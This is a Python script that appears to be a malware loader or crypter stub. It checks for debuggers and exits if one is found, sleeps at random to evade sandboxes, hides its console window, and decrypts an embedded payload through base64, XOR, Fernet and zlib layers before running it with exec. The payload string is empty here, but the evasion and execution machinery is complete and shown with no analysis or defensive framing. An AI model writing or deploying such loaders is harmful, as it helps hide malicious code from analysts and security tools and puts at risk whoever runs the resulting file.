
import base64, zlib, marshal, sys, os, ctypes, random, time

def anti_debug():
    try:
        if sys.gettrace() is not None:
            sys.exit(0)
    except:
        pass
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            sys.exit(0)
    except:
        pass

PAYLOAD = """"""

# FIXED: Salt as string with quotes
KEY_PARTS = ['k7S-1JE81fs-G7Zo', 'GV1wX9zmGaeIymdt', '-EUuuvZO5bg=']
SALT = "51fdc41bc010dcae853ed5166e5d5850"

def generate_key():
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    import base64
    
    full_key = KEY_PARTS[0] + KEY_PARTS[1] + KEY_PARTS[2]
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=SALT.encode(),
        iterations=100000,
    )
    return base64.urlsafe_b64encode(kdf.derive(full_key.encode()))

def xor_decrypt(data, key):
    key_bytes = key.encode()
    return bytes([data[i] ^ key_bytes[i % len(key_bytes)] for i in range(len(data))])

def decrypt_payload():
    anti_debug()
    time.sleep(random.uniform(0.5, 2.0))
    
    try:
        b64_decoded = base64.b64decode(PAYLOAD)
        xor_key = KEY_PARTS[0] + KEY_PARTS[1]
        xor_decrypted = xor_decrypt(b64_decoded, xor_key)
        
        from cryptography.fernet import Fernet
        aes_key = generate_key()
        f = Fernet(aes_key)
        aes_decrypted = f.decrypt(xor_decrypted)
        
        decompressed = zlib.decompress(aes_decrypted)
        exec(decompressed, globals(), locals())
    except Exception as e:
        pass

try:
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
except:
    pass

if __name__ == "__main__":
    decrypt_payload()
    while True:
        time.sleep(3600)
